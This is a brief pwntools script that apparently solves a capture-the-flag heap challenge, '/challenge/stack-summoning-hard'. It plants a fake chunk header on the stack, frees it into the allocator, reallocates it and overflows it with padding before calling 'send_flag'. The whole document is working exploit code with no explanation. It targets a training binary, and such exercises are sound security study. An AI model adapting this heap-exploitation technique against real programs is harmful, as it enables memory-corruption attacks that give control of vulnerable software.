from pwn import *

p = process("/challenge/stack-summoning-hard")

p.sendline(b"stack_scanf")
p.sendline(b"\x00" * (64 - 8) + p64(0xd0))
p.sendline(b"stack_free")

p.sendline(b"malloc 0 200")
p.sendline(b"scanf 0")
p.sendline(b"A" * (171 + 8 * 2))

print(p.clean())

p.sendline(b"send_flag")
p.sendline(b"A" * 16)

print(p.clean())

p.close()
